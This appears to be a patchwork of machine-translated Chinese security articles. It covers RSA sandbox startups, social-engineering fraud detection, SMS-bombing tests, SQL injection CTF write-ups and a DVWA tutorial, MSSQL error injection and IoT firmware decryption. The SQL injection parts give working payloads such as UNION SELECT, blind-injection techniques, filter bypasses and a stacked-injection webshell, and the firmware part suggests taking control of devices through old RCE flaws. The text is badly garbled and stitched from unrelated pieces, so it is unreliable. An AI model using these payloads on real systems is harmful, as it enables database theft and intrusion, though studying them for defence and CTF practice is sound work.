The author might wish to make some conjectures, in the management and control side, WIZ may be the cloud management platform and arrangement system risk assessment, this part of the analysis does not need to deploy Agent; but in the data side, in the face of the cloud workload and business, WIZ may be a static analysis of the virtual machine mirror or container mirror, which can achieve offline, out-of-band security analysis, static analysis can avoid the defects of low coverage of dynamic analysis.

Of course, these are just the author's analysis, maybe we need to wait for more detailed materials out before we get a more credible basis.

In my opinion, WIZ is very competitive in the competition of RSA innovation sandbox, and its emergence will also redefine the security of cloud infrastructure.

Combine cybersecurity to define social engineering: From a psychological perspective, plot an elaborate scam to induce target people to disclose confidential information for the purposes of collecting information, fraud, or access to user systems.

And the use of social engineering is usually one of the essential steps in complex scams.

At present, under the category of social engineering, cyber security may suffer attack types are divided into the following four kinds: 1. Static confidential information collection (Static Credentials Harvesting) phishing attack / voice phishing attack / SMS phishing attack: this kind of attack will lure victims to actively disclose confidential information, such as personal information, bank information and other sensitive information.

RAT Trap (RAT Traps) Before an attack, the attacker induced the victim to install a remote control tool (RAT) on his PC or mobile handheld.

OTP collection works with user distraction via telephone fraud to collect OTP for immediate use.

For example, the Trojan MITB is designed to distract users and collect OTP.

Deep social engineering attack is different from the traditional social engineering attack. Deep social engineering attack seems to be a more perfect fraud, leaving the victim unaware and psychologically unaware that he has been trapped in the fraud.

The real purpose is to transfer its funds directly to the fraudsters.

Standard social engineering attacks evolve with the web, and the popularity of e-finance.

A growing number of online scams have turned to electronic banking, whose ultimate aim is to use various means to defraud victims of property.

However, for the first three social engineering attacks, from some details that normal and abnormal operations can be identified.

For example, the two examples in the figure below are the differences caused by the normal operation and the abnormal operation under the login page, specifically manifested as the trajectory of the mouse movement and the payment fluency, etc.

Under normal operation, login online banking: the mouse movement track is smooth and continuous, the keyboard is used to input OTP, and all the behaviors match the account benchmark.

Log in to the online banking under abnormal operation: the mouse movement track appears to jump, lag, or interrupt, the payment exception (because the remote control of your attacker may be in different countries).

Although, these offline social engineering attacks are not directly detectable.

But we can detect fraud through exceptions at the user level and at the overall level.

For example, the track from the mouse, rolling mode and time, keyboard delete information, the way to choose the country, etc.

Deep social engineering attack Deep deep social engineering attack is a brand new scam.

It first appeared in Britain in 2019 and later gradually spread to Europe, Australia and across North America.

We can observe, from some subtle traces, some unusual behavior that the user shows when suffering from this attack.

For example, if the attacker stays on the bank page for too long, the mouse will move back and forth for too long, and the user does not know what to do.

Because during the whole process, the attacker constantly uses language to create a story, allowing the attacker to believe that he is not in a scam, the behavior seems distracted, not focused on the page of the bank.
And, on the final submission button, the attacker is extremely hesitant.

When the attacker uses the telephone voice, the overall volume of the voice is stable under normal circumstances, without large changes.

But under deep social engineering attacks, speech can fluctuate.

According to BioCath, mobile phones often move from their ears to different locations because users want to record their destination accounts.

The following figure: From the time for users to input information (such as the account number), we can find some differences.

In general, the user's input time is shorter than normal, because the user needs to dictate the new account given by the other party.

Similarly, there are also some subtle actions that can see the user's hesitation and uneasiness.

For example, the time to click the submit button and the user rolls the mouse wheel frequently after the transaction.

As shown, the rolling rollers are much more frequent than are normal.

Finally, integrate differences in multiple weak signals, through machine learning, and finally to determine whether to are attacked.

Summarize standard social engineering attacks, current trends 1. persuade users to install remote access tools on PC / mobile devices.

Pretending to be a bank, tricked users into providing OTP codes over the phone.

Used in Trojan attacks to distract users and collect OTP.

1. Guide users to remit money to criminals.

Trusted devices, no malware / RAT, no criminal act.

As this is a fully authorized trading process, it is not a real fraud, but regulators demand action.

The software supply chain can be divided into three major links: development, delivery and operation. Each link may introduce the supply chain security risk and suffer from attack, and the security problem of the upstream link will be transmitted to the downstream link and amplified.

It is worth noting that the upstream manufacturers are attacked in the supply chain attacks, while the upstream and downstream manufacturers are threatened.

Upstream code risk problem is actually the supply chain problem that downstream manufacturers need to pay attention to.

Managing risks in upstream software development helps to reduce supply chain attacks facing downstream vendors.

What code risk platforms can solve is the supply chain attacks occurring during software development.
Using third-party applications and exploiting the vulnerabilities contained in the open source code base can be alleviated by timely upgrading or utilizing the patches provided by security companies, but there is no relatively effective general solution for supplier product injection and malicious takeover.

Apiiro proposes for supplier product injection and malicious takeover to use the identification compilation process injection and use algorithms to identify the malicious takeover to deal with both attacks.

For the vulnerabilities generated during the software development process, we give a change-based risk view to achieve the security left shift, and judge the risks included in the change.

Apiiro's solution Apiiro is the first enterprise in the industry to propose a code risk platform.

The Apiiro code risk platform can help customers conduct effective risk management early in the SDLC process, strengthen application governance and compliance detection, while preventing advanced attacks against CI / CD.

Apiiro analyzes data throughout the development process to help organizations identify, prioritize, and remedy major changes at risk.

Apiiro helps organizations build an application risk plan [3] by providing information across applications, infrastructure, developer knowledge, and risk visibility of the business impact.

Security left shift: identify the risks contained in changes and timely intervene in security review For risk management in the software design and development process, Apiiro uses risk views based on time points and risk dimension, according to the changes submitted, the knowledge and behavior of developers, and prompts users of the risks contained in business impact.

Establish a list of business impacts for all products, whether they are network applications, code components, security controls, data models, licenses, dependencies, and the knowledge, location, and behavior of developers.

For example: which products and which components (API, UI, backend, mobile, etc.) are using a particular library + who upgraded it + when + which developer changed the code + his / her knowledge + where it was deployed, etc.

Determine the historical audit track of all major changes for all code components.

For example, filter the history of all hazardous material changes in a specific library to understand the point in time and change background.

Context security processes are automatically triggered (e. g., security design review, security code review, SAST, and DAST) only for significant changes in risk in key code components (e. g., critical business logic remittances).

Create a unified risk view on all nodes in Fig for each submission, PR, or publication.

This will help you to make informed risk-based decisions.

Approved significant risky changes based on only a unified risk view.

Based on this way, you can have a global risk view of the risks contained in the project species, based on which you can see what impact a developer has on changes to a codebase.

And approve the significant risk changes based on the change risk.

At the same time, context security processes are automatically triggered only for major risk changes in key code components, which can help focus security review forces in important components and accelerate DevSecOps speed.

Supply chain security: Using algorithms to identify malicious takeover For developer accounts are stolen or open source software is maliciously taken over, Apiiro uses UEBA and exception detection technology to detect whether the user's submission deviates from the normal user's behavior according to the user's submission content, submission time and frequency.

And automatically comment on the suspected submitted PR.

Some metrics that the algorithm triggers abnormal alarms include [3]: 1. Submit recent activities related to submission intensity. 2. submission time differs from the user's expected activity date and time 3. Contributors, deviate from the common pattern of his peers in the repository. Significant differences between the 4. submission information and the analysis code. The code added by 5. is significantly different from that predicted by the model of this repository. Based on the above metrics, Apiiro trains models to detect malicious behavior using machine learning and AI algorithms.

The detection model is based on behavior and character content and is independent of language and platform.

This is a general way that can be used for open source software monitoring or internal development detection, which can be used to internal companies to monitor malicious hosting of open source software or whether internal development accounts are stolen and used to submit malicious code.

In response to SolarWinds events, Apiiro gives a way to detect whether source codes and binaries match.

The comparison algorithm was performed using the icon entity graph from the binary and the same data graph learned from the source code.

When multiple mismatch risk factors exist, it indicates that the code has been tampered with.

To.NET binaries are an example.

The Apiiro platform will resolve the executable [3]: · Understand all possible logic processes and symbols, clear all automatically generated compiler logic, Adjust the expected differences between runtime versions. When the analyzed data maps and the source code are detected, a malicious code injection occurred during compilation.

This solution is aimed at the attack of injecting code at compile-time.

Files were analyzed before and after the injection of malicious code and detected whether the risk of compile-time injection was included.

It is an effective solution for upstream manufacturers to ensure that the compilation process is not injected.

For downstream affected manufacturers, because the compilation process injection occurs in upstream manufacturers, in the case of no source code if you want to check whether upstream products contains malicious code, can only through binary check to analyze the risks, although binary analysis for malicious code false report is obviously not as good as the source and binary at the same time, but the coverage of binary analysis coverage is wider.

If the detection scheme is injected using SCA + SAST with the source code is available, it can confirm the security of the product provided upstream.

So this way requires the cooperation between upstream and downstream manufacturers to confirm that their upstream is not affected by this attack way.

For the supply chain security, on the one hand, it is to ensure that the upstream products have no safety problems, and on the other hand, it is to ensure the safety problems of the whole cycle of their own products.

This requires the code risk platform to have the ability to detect and continuously monitor the upstream products, and to conduct the risk control of its own product Devsecops process.

For upstream products, we can provide security monitoring services, with security scanning capabilities where code or binary files are available.

Also provides security monitoring services for malicious takeover and public vulnerabilities in the software / components.

Risk control of the Devsecops process is required for safety issues in their own product development cycle.

We need to assist the software development organization in troubleshooting every possible attack point in the Devsecops process, and to conduct continuous functional verification and configuration verification.

Security knowledge can be used to assist software development organizations in identifying hidden risks throughout the Devsecops process and to provide an overall set of Devsecops solutions.

This includes code security (SCA,SAST, etc.), code library security (malicious takeover), host security (SolarWinds events are caused by compiler control), product library security, etc.

This requires a code risk platform combining Devsecops security capabilities, traditional security capabilities and their own security capabilities to cover these vulnerable points.

The most important thing is that the code risk platform needs to monitor the global risks views established in the project to check the risks contained in the development process and achieve a safe left shift.

This requires the code risk platform to focus the security capability on one platform and has the ability to conduct a comprehensive analysis of the data, analyze the different types of alarm information of the numerous security tools and the data generated in the development process, and give a unified risk-based view.

This effectively helps software development organizations to control the risks in the development process and deal with supply chain attacks.

Since it first mentioned the Devsecops concept in Gartner 2017 years until this year, Devsecops has been exploring the road to landing practice.

In 2021, supply chain security products won the first sandbox champion of RSA, indicating that Devsecops has been transformed from concept to practice and found the direction of development.

After years of accumulation, Green Alliance Technology will soon launch the Green Alliance Code Security Audit System (SDA) to implement the Devsecops concept and adopt a more practical way to realize a link of supply chain security.

Through static analysis, component composition analysis, and firmware analysis, the safety of application delivery is fully guaranteed during the development, testing, handover, and release stages.

The original firmware analysis module can still complete the analysis based on system-level scanning without source code.

In terms of component composition analysis, in addition to the material inventory sorting, it can also be tracked according to the safety life cycle of the project; for the newly discovered vulnerabilities, the affected items can be quickly investigated.

Both upstream suppliers can assess the risk range in time with vulnerabilities or affecting downstream users.

At present, domestic enterprises have gradually migrated to the Devops development mode, and the CI / CD process is becoming more and more perfect.

To adapt to the agile development model, the Green League Code Security Audit System (SDA) provides a flexible interface in a non-invasive approach to easily access to existing Pipeline without adding the original security management process.

Similar to the Apiiro context risk analysis, the Green Alliance Code Security Audit System (SDA) adopts the unified defect risk assessment standards for the whole life cycle, combined with historical submission records, vulnerability repair methods and manual review results, automatically evaluates the vulnerability repair priority, and accelerates the release of the application version on the premise of risk minimization.

Founded in 2018 by Dor Knafo and Gil Azrielant, a zero-trust startup registered in California, Axis Security has raised four rounds of financing and invested nearly $100 million.

Two Axis Security founders were alumni of the Israel Herzlia Interdisciplinary Research Center (IDC Herzliya), where Dor Knafo worked as a senior software engineer in the IDF and then entered Symantec as a senior researcher; Gil Azrielant served in the IDF Unit 8200 [2].

Axis Security is committed to providing simple and fast zero trust solutions that help customers quickly implement zero trust and avoid the security risks of virtual private networks (VPN).

Before analyzing Axis Security's products and related technologies, we first introduce the concept of "zero trust".

Zero trust is a new cybersecurity concept, rather than a specific technology or product.

In the traditional concept of network security, the enterprise network is divided into internal and external networks, there is a clear boundary between them, inside the boundary is usually considered safer, outside the boundary is unknown and full of risks.

However, with the development of technology and the evolution of network architecture, people find that such a "boundary trust hypothesis" has defects. The —— extranet is certainly full of risks, but the Intranet is not necessarily safe, and there will also be threats.

Excessive trust and reliance on such boundary division may have serious consequences. For example, an external attacker can easily move horizontally and roam through the internal net, while the internal attacker can easily attack it.

Faced with these issues, in 2010, John Kindervag, then a Forrester analyst, proposed the concept of zero trust (Zero Trust).

Zero trust emphasizes that the default trust does not exist, the network location no longer determines access, and every request, wherever it comes from, is checked to confirm legal authorization.

Later, Google took the lead to implement BeyondCrop,, a network security architecture based on zero trust model, in 2011 and announced its completion in 2017, and BeyondCrop was widely used in the daily office of Google employees.

In 2014, the International Cloud Security Alliance (Cloud Security Alliance, CSA) released the Software Defined Boundary (Software Defined Perimeter, SDP) Standard Specification 1.0, SDP is consistent with zero trust network [3]: 1. Wherever users and server resources are, ensure all resources are secure.

In 2019, the National Institute of Standards and Technology (NIST) released the draft Zero Trust Architecture, revised again in 2020, and officially released in the same year (NIST.SP.800-207）。

According to Zero Trust Architecture, zero trust is a cybersecurity paradigm featuring resource protection on the premise that trust is never granted implicitly, but must be continuously evaluated.

A zero-trust architecture is an end-to-end enterprise resource and data security approach, including identity (human and non-human entities), credentials, access management, operations, endpoints, host environments, and connected infrastructure.

The key problem for zero trust is to prevent unauthorized access to data and services and to make the implementation of access control as fine as possible.

The core logic components of the zero-trust architecture are shown in the figure below: For more information about zero-trust, refer to NIST.SP.800-207 Standard literature for Zero Trust Architecture.

As a provider of zero trust solution, Axis Security's current main product (and only product) called Application Access Cloud, is "Application Access Cloud directly."

It does not appear that the name is not possible to accurately draw the function of the product. We will analyze the schematic [4] of the official website: the left picture above depicts the use scene of the traditional VPN, and various terminals access the cloud and network of the enterprise through the VPN; the right side depicts the cloud and network of the terminal access to the enterprise through the Axis Cloud.

According to officials, Application Access Cloud is an application-layer zero-trust secure access solution, simple to deploy and powerful.

The scheme does not require changes to the original application, server, or network, or the user side terminal or deploy agent, on the terminal side to deploy a Connector and Axis Cloud on the resource side.

The Connector is essentially a reverse proxy, the [5].

All zero-trust access functions are completed by Axis Cloud and Connector, with terminal access to business resources via Axis Cloud.

Notably, Connector is a containerized [5] for easy deployment in cloud-native environments such as Docker or Kubernetes.

Terminal-side no agent (agentless) does reduce a lot of trouble and overhead.

In fact, the agentless is relatively relevant.

According to founder Gil Azrielant [5], agentless covers mainstream services such as Web, RDP, SSH, Git, and Database Services.

If the terminal only needs to access these services, it does not have to install agent.

Installing agent allows the terminal access to almost any form of network service.

The services provided in these two ways (to install agent or not) are complementary.

Axis Cloud itself is deployed on a number of public clouds, including Google Cloud, AWS, which improves the stability of the entire system, avoids business disruption caused by a single cloud service provider failure, and also improves the access speed of users in different regions.

Application Access Cloud provides a console interface from which it is clear about terminal access to the application: in addition, command line, screenshots, and other —— for a specific user.

Application Access Cloud provides easy-to-understand policies and security policies are defined to enable users to customize security policies.

Ensure that employees have secure access from anywhere. Axis Application Access Cloud provides access to enterprise applications and resources wherever they are.

It takes a few minutes to complete the configuration, not having to modify the terminal side network or install client software.

Enterprises can manage all their users, applications, and policies through a centralized cloud console.

Unlike network-layer solutions, Axis provides complete observability and application-level fine-grained user activity control at the level.

Axis avoids app attacks by isolating apps from users, terminals, and the Internet.

In the process of zero-trust construction, enterprises are usually very concerned about business continuity.

Axis Application Access Cloud provides scalable enterprise-level services to reduce the workload of enterprise existing network resources.

Using Axis reduces the risk of casual access to important resources; centralized access management schemes avoid the reconfiguration of the enterprise infrastructure.

A xis Security's Application Access Cloud solution relies on cloud computing, and only the deployment of connector, on the terminal side greatly reduces the technical obstacles to enterprise migration from traditional VPN access to zero-trust networks.

These obstacles in these technological transformation are also important reasons why many companies have been slow to shift to zero trust.

Axis Security's official website says that more than 54% of organizations don't know how to start landing zero trust.

Therefore, from a technical point of view, the solution that Axis Security provides reduces the application threshold of zero trust, which is very attractive for enterprises that want to solve the disadvantages caused by VPN with zero trust.

However, the author noted that Axis Security's zero trust scheme has some degree in architecture and functionality similarity to the Enterprise Application Access zero trust solution [6] released by Akamai, an established CDN service provider.

How to find and identify your innovative and technological lead, and then maintain it, is important for startups like Axis Security.

On another perspective, does Axis Security provide zero-trust access based on public cloud computing, does this bring other concerns to potential customers?The introduction of the public cloud means that enterprises must transfer all access traffic to third parties, rather than the zero-trust software and hardware devices purchased and deployed themselves.

Enterprises must carefully understand the respective rights and responsibilities of themselves, Axis Security and public cloud manufacturers in the cloud computing "responsibility sharing model" [7], and fully assess the potential risks and risks triggered loss and compensation possibilities.

In addition, the —— multi-cloud deployment certainly improves the system robustness, but different public cloud vendors may provide different security protection capabilities and protection degrees, and the responsibility models will vary slightly.

Businesses only need to connect with the Axis Security?Or should we fully examine every public cloud vendor that Axis Security relies on to ensure that its services meet its security needs?Finally, all countries and organizations around the world are issuing or improving data security standards and regulations, these standards and regulations are different, such as the European General Data Protection Regulations (GDPR), China Data Safety Law (draft), etc.

Can the Axis Security meet the data security regulatory requirements of each region?This is also something that companies need to consider.

Overall, the concept of zero trust has existed for a decade, but this technical concept has landed slowly in reality.

Axis Security solves the technical pain points of the enterprise in a simple and elegant way, with great innovation and value.

If it can dispel their concerns in other aspects, it may turn many traditional industries into their customers and greatly promote the implementation process of zero trust.


What surprises will this year's RSA conference bring to us?In the first phase of the second season of the Green Alliance King of Coffee Time, we invited Dr. Liu Wenmao, director of the Green Alliance Science and Technology Innovation Center, to talk about this year's RSA.

Topic 1 for four consecutive years, data security has been the focus of the RSA innovative sandbox competition, 2018 champion BigID, 2019 runner-up Duality, 2020 year champion Securiti.A ai are committed to data privacy.

Using the package software can replay the request for the back end of no restrictions on the website can achieve the effect of SMS bombing.

Vulnerability prevention is mainly SMS bombing for single users, namely replay send request and phonenum is a value.

Put the package to see if the return package contains a text message verification code.

According to the normal business process for registration, modify the password, password recovery and other business operations, open the burpsuite grasp package.

Observe whether the return packet contains the state code such as Y with N, true with false, Error with Success etc, try to modify the status code, put the packet, and observe the return packet results.

Similarly, you can also follow the business operation according to the normal business process, and open the burosuite to grab the normal data package, and record it.

The test is followed up.


The SQL injection attacker can inject his own statement into a normal SQL statement, so that the original SQL statement changes and executes the SQL injection.Whole type injection injection point data type is whole type is the whole type injection, the following input is different id, different results will be taken from the database.

The id we input is spliced directly into the sql statement, which allows us to directly take over the sql.

Various information is obtained by injecting s q l statements at id.Here we can construct the joint query payload to obtain the information, which first need to judge the number of fields of the query statement, and the page gives the correctly executed results when the number of query fields is greater than or equal to this number.

When the number of query fields is less than this number, the page gives the wrong execution results. You can determine the number of query fields here to be 3. The result display bit can be determined by the joint query.

The s q l statement executed by mysql is, In the id section we need data not available in a database (such as 0), Determine the number 3 of the joint query, Table can be obtained by the mysql System library (information_schema), Get the column information of the table below The following group_concat function of mysql can merge the query result into a result after obtaining the information of the table and column and can query the specific data character type injection character type injection is not very different from the whole type injection, The main difference between the two is that the character-type injection requires closed quotes.When we inject a quote mysql goes wrong when executed.

After processing quotation marks by various means, payload similar to integer injection can be constructed to obtain various information.The quotes brought behind the sql statement can be annotated, closed, etc.

Later, the same as the whole type, the quote processing error injection is no longer repeated when the program does not output the query results, but will output the mysql error information, you can use the error injection to obtain the information.

The error-reported injection does not need to obtain the display bit as the joint injection, because the error message is the display bit.

Error reporting injection usually uses the following function updatexml error reporting usage extractvalue reporting floor error reporting usage, The probabilistic false reporting or r a n d function can generate a random number between 0-1, While floor is an integer less than equal to the incoming value, we can get a random number between 0-2 when we use rand() * 2, If you use floor, you can get a 0 or 1mysql, and you can group the results using group by, Draw the same results into a group, count(*) can count the number of blind injection injection results without any return, that is, the blind injection Boolean blind injection according to the Boolean value of the injection execution results (true, Or the false), Pages display a different, As the basis for judging the resulting injection is the Boolean blind note that we can gradually judge the back-end results by constructing sql statements, As follows, when the page shows the wow, Note that the first character of the database is s, from this, Further injection determines that the current database full name is sqli.

To improve the injection efficiency, Scriscript can be written as follows (annotated highlight_file (__FILE__)) this script compared to manual injection, Efficiency has been greatly improved, But the shortcomings of the script are still obvious- -because every character should be judged, It's not running fast enough, so we can write a script using the dichotomy, The following time-lapse blind injection in the injection results will not be output, And whether the injection success or failed page always has only one response, Time-lapse blind injection can be performed, It takes a function of time to execute by mysql as a criterion for whether the injection is correct or not.

It was determined that sql injection after local testing found that the statement we injected in insert could constitute Boolean type results, So you can do the boolean blind note fuzz about which characters are filtered, Even if the bp is set with the 1 thread, Also will be interfered with by the buuctf restriction request to, So the write script information was filtered out that we were unable to get information such as table names (the sys database does not necessarily exist), Guess the table name flag, Direct because the column name could not be determined (select flag from flag, was tested first Error) First make sure our Boolean blind bets is fine, Write the script 2.

After fuzz it was found that select is filtered but uppercase select bypassed the old writing script following BJDCTF 2nd simple injection access robots.

The txt found the prompt file hint.

After txtfuzz, it was found that the following key lists and double quotes were filtered.

To inject a statement, you first need to escape a single quote, here it is simple to escape a single quote brought with the sql statement, and then escape a quote.

Then the statement is constructed at password to inject the data a n d is filtered, but o r is available. The o r + different operation results in different boolean values and found that the page response information is different.

Test payload and so writing script the following SUCTF 2018 MultiSQL normal registration login edit avatar, can upload picture user information and registration place exists s q l injection.

The former is stacking injection and the latter is secondary injection.

Here use stack injection to write webshellpayloadCISCN2019 day2 easyweb in robots.

The backup file is found in txt.

Because the presence of addslashes cannot be closed directly, and cannot be used to escape single quotes.

But the incoming data in lines 11-12.

Construct a single-escape quote.

Dichotomy script login upload regular shell, suffix cannot be php, use phtml around view the file, is the user's upload record, record the upload file name consider modify the file name is shell, because the file name will detect the keyword php, so only use php short label to access the log file RCTF2015 EasySQL program a few functions: registration, login, modify the password, view the article.

It can be seen from these results that the output results have a length limit, but this does not prevent us to guess that the field commonly used for real_flag_1s_here are filtered length 690, the real flag hidden inside, you can first try to flip all the results, can be seen as part of the flag.

Here try to get the results regularized and the rlike is filtered but you can use the rlike function of the same name.The combination gives a semi-automatic script NCTF2019 SQLi gives the sql statement hint to get the password can getflag, The ban has a lot of characters, The function substr that intercept characters cannot be used, Function that need () can not be used but here you can use regular matching to curve to save the country first, Make to escape quotes, Then construct payload so that the results are different for true and false, Here the%00 is not a true%00 but a character with ascii code 0, truncate the quotation marks behind the sql statement (comment is filtered) with this character when the query statement is true, The page will redirect can take the status code as the standard to judge whether or not correct, so write the script the following CISCN2019 North China division Day1 Web5 CyberPunk read the source code also found the prompt file hint.

After some php audit, at search.

An injection point found in php filters some injection keywords, unable to inject deeply before looking elsewhere in change.

The secondary injection parameter was found in the php as unregulartested, and only uses the addslashes escaped character in the 21st line of the code. You can see that it not only modified the current address, but also saved the old address.

This secondary injection produces a construct payload validation script The following results show only that the 31-bit test found the presence of flag.

By txt, read the file GYCTF2020 Ezsqlifuzz available character results the following substring is filtered, but substr can test boolean results with construct payload, so the script can be written.

SQL injection attack learning, we aim more to learn attack techniques and prevention strategies than to deliberately to attack the database.

First, we first go to the experimental address "SQL Injection".

SQL injection is a code injection technology that used to attack data-driven applications, essentially injecting malicious SQL code into specific fields for drag library attacks, etc.

The success of SQL injection must be due by security vulnerabilities in the application, such as abnormal SQL statements when not properly filtered (for some particular string) or special emphasis on S Q L statements.

SQL injection is the most commonly used attack technique in web site penetration, but in fact, SQL injection can be used to attack all SQL databases.

The direct reason for Sql injection is to piece together SQL, the vast majority of programmers will not pay attention to how SQL eventually runs when doing development, let alone the security of SQL execution, it is with this lazy programmer SQL injection has not disappeared.

This vulnerability is not unavoidable, but that programmers do not have this security awareness.

For an injection vulnerability, many people may now think that it is obsolete, because this vulnerability can be eliminated by parameterized queries.

In the past, there were three main ways to defend against this vulnerability: string detection: limited content can only be determined by English, numbers and other regular characters. If the user input special characters, directly refused.

But the disadvantage is that there will inevitably be some content in the system containing special characters, at this time can not be rejected warehousing.

String replacement: replacing dangerous characters with other characters, the disadvantage is that there may be many dangerous characters, a single number of replacement is quite troublesome, and there may be fish missing the net.

Stored procedures: Pass parameters to stored procedures for processing, but not all databases support stored procedures.

If the command executed during the stored procedure is also produced through a splicing string, there is still a vulnerability.

Let's practice, so better understand.

Let's look at the general idea of the experiment (1) find the injection and confirm (classic and 1=1 and1=2) (2) query basic information (database type, database name, application name, system type and system type) (3) check the table name, field name, get what we want to query first we's look at the source code this is the sql query statement caused the most common SQL injection.

We continued the experiment, this time took advantage of the dvwa, we logged in to the dvwa and then choose the SQL Injection under the difficulty choice low.

The first step of sql injection was first tested whether there is a sql injection vulnerability.

When ID is equal to 1 can normally return And 1=1 can normally return And 1=2 return error here directly returned the home page, unlike the page of and 1=1.

Here exists the SQL injection.

Why is there a sql injection?The principle is to substitute test statements into the database query and is logical operation 1=1 is true 1=2 is false so return different.

Well we take the second step to determine the number of fields, order by 2 returns normal order by 3 returns error.

The number of fields has been judged, how to further judge the basic information and user name and so database.

Using the statement query knows there are two fields and then the database name and user.

Query the basic information such as the database.

UNION SELECT 1,CONCAT_WS (CHAR (32,58,32), user (), database (), version ()) This is the usr database version. that returns directly to the database

We know that the name of the database can find the table to the query statement.

There is more than sql injection, there are many types: 1) What types does injection divided into?What is the classification basis?Is it the only one?What is the difference between 2) ordinary injection and blind injection?What is the difference in using the methods?This experiment is introduced here, pay attention to more to summarize and think about the problems after class!In addition to learning, more important is to learn how to prevent SQL injection.

In the face of SQL injection attack, to understand its principle can be better prevented.

The following summarizes the key points to prevent SQL injection attack: 1. Never trust the user's input, to verify the user's input, you can be single quoted and double "-" through the regular expression, or limit the length, etc.

Never use a dynamic assembly SQL. You can use a parameterized SQL or directly use stored procedures for data query access.

Never use a database connection with administrator privileges, and use a separate permission-limited database connection for each application.

Do not store confidential information in text, please encrypt or hash drop password and sensitive information.

The applied exception information should give as few tips as possible, and it is best to wrap the original error information using the custom error information and store the exception information in a separate table.

A explicit injection attacker can get what you want to get directly in the current interface content.

The results returned by the error report injection database query are not displayed in the page, but the application prints the database report error information to the page, so the attacker can construct the database report error statement to get the desired content from the report error information.

The blind note database query results cannot be obtained from the intuitive page, and the attacker gets the content to get by using the database logic or delaying the database library.

MSSQL manual injection Unlike SQL injection, the displayed field used by SQL, MSSQL, insert malicious s q l statements, make the query error, in the reported error, show the information we want.

Test statement: http://www.xxx.cn/xxx/xxx.aspx?id=1 and @@version> 0 Note and @@vsersion> 0 can also be written as and 0/@@version> 0: In the nvarchar value Microsoft SQL Server 2008 R2 (SP3) -10.50.6000. 34 (X64) Aug 19 2014 12:21:34 Copyright (c) M i c r o r o s o f t C o r p o r a t i o n E n t e r p r i s e E d i t i o n (n 4-b i t) o n W i n d o w s N T 6.1 <X64 (Build 7601: Service Pack 1) (Hypervisor)'failed when conversion to data type int.

Reason: @@version is the global variable for MSSQL if we are in "?With id=1 "plus" and @@version> 0 "then the statement after" and "changes" @@version" force grab to int type to compare the size with 0 but the type conversion fails so exposes the database information.

Query the computer name @@servername:MSSQL global variable, representing the computer name.

Error reporting message: Failed to convert the nvarchar value 'WINDOWS-XXXXXX' to the data type int.

Query the current database name db_name(): Currently used database name.

Error reporting: Failed to convert the nvarchar value 'abc' to a data type int.

Query the user User_Name() currently connected to the database: the user currently connected to the database.

IOT security involves a wide range of content, and this series will talk about the author's understanding of IOT vulnerability research from the technical level.

The author will discuss from five dimensions: firmware, web, hardware, IOT protocol and mobile application respectively. Due to the limited level and ability, improper or omissions are welcome to correct or supplement.

The IoT firmware base is the first topic to explore, because of the comparative basis, IOT vulnerability research generally cannot be bypassed.

The following describes four parts: firmware decryption (if encryption), unpacking, simulation, and security assessment from the firmware overall.

Some IOT devices will encrypt or even sign the firmware to improve the research threshold and the security when upgrading, because encryption and decryption are more resource-consuming, and such devices will generally be highly configured, such as some routers and firewalls.

It is easy to judge whether the firmware is encrypted, experienced partners have a binary editor open can see one or two, generally there will be the following features.

Except that the firmware indicator header has no visible characters, (excluding header) data by bit expansion 01 frequency is basically consistent binwalk (-e) cannot resolve the firmware structure, and (-A) does not identify any cpu architecture instructions if meet the above features will guess the firmware has been encrypted, firmware decryption will generally be from several angles, but is not limited to the following methods.

This method is limited to the firmware always present in an encrypted state, loaded to flash, when the system starts and the device lacks (UART/JTAG et al) dynamic debugging means.

Since there is a full decryption process in flash, the decryption purpose by the programmer can be read from the flash, reverse decryption algorithm and key to decrypt the firmware.

For example, the flash memory distribution read from a device is as follows: obviously we need the encryption process in boot section, we need to find encryption algorithms and keys, general encryption adopts public group algorithms such as AES, the key is to find the group mode, IV (non-ECB) and key.

Loading the boot into the IDA pro is not automatically identified: you can be manually identified by comparing the interrupt vector structure at the beginning of the ARM code, with the common entry code as shown below.

The encryption algorithm is AES, and the key is obtained through the sha256 hash of the device serial number.

Identifying such structures through IDA pro will be discussed in RTOS later, the device security level using this firmware encryption mode teaches high, general devices only conduct decryption authentication when upgrading.

Direct reading is the most easy to understand, sending the firmware (packaged) back after the device starts using UART, JTAG, Console or network, thus bypassing the decryption process.

It is worth noting that the devices need to provide these interfaces, the specific methods vary from device to device, and the use of these interfaces will be introduced in the hardware article.

This method applies to the manufacturer who initially did not adopt the encryption scheme, where the old firmware is not encrypted, the decrypted program is added to an upgrade, and then the upgrade uses the encrypted firmware.

This way we can find the boundary version between encrypted and unencrypted from a range of firmware, and the unpacking of the last unencrypted version can restore the encryption process.

Unpack to locate upgrade program locations containing combined keywords such as "firmware", "upgrade", "update", "download" " by downloading a router firmware as shown above.

Of course, there are debugging means can also ps view the process update positioning upgrade program and parameters: through the IDA pro reverse encimg program to quickly get the encryption and decryption process code, using the AES CBC mode.

This method is applicable to the upgrade program that has been obtained through interface or boundary version, can use the box detection tool of grouping algorithm to distinguish encryption algorithm and location location, of course, binwalk can also analyze some simple cases, such as an industrial controlled HMI firmware.

Load the upgrade program directly and locate the openssl call easily gets the decryption command.

If the key can not find the boundary version, and can not find the debugging interface or is not familiar with the hardware debugging, you can consider using the historical version vulnerability to get the control of the device first, and you get the reverse encryption algorithm of the upgrade program.

This method is more clever, requires the historical firmware of the device with an RCE vulnerability, obtain the permission, download the required upgrade program, and then reverse get the encryption algorithm.

Those who first enter the IOT safety research will think that the firmware unpacking is very simple and straightforward, but the ideal is very full, and the reality is very skinny. With the firmware test, you will find that the binwalk can not be solved in many cases.

IOT firmware is generally divided into two categories, one presence file system, mostly based on linux/BSD, Another firmware is a whole, as we call RTOS (Real-time operating system).

binwalk should be very familiar with, using binwalk can directly get the rootfs file system here is not repeated here, I think that the strength of binwalk is that you can analytically identify multiple format header, to provide reference for unpacking.

UBI format firmware is more common, binwalk is not directly package, but there are existing tools online ubi_reader, here is a need to note: UBI_reader unpackage, UBI file must be 1024bytes integer times, need to add and delete content for example by analyzing a router, found that its rootfs is UBI format: first install ubi_reader: or directly and then extract the UBI structure according to the address, use can be package.

Some firmware binwalk s can recognize header, but cannot unsolve. For example, the following firmware runs the results and finds that nothing identifiable, so you can manually analyze or search for some relevant tools.

Here is a simple look at the firmware unpack key code, the key is to find the header, like '\ \ xA5\\xA5\\xA5\\x5A\\xA5\\x5A' after decompression according to the specific format, so firmware unpack in the final analysis or data format analysis.

Openwrt Lualua structure parsing may not be appropriate here, but given the large base of Openwrt usage, simply mention it here.

Lua is an easily embedded, and scalable, lightweight script language that will be used in Openwrt development.

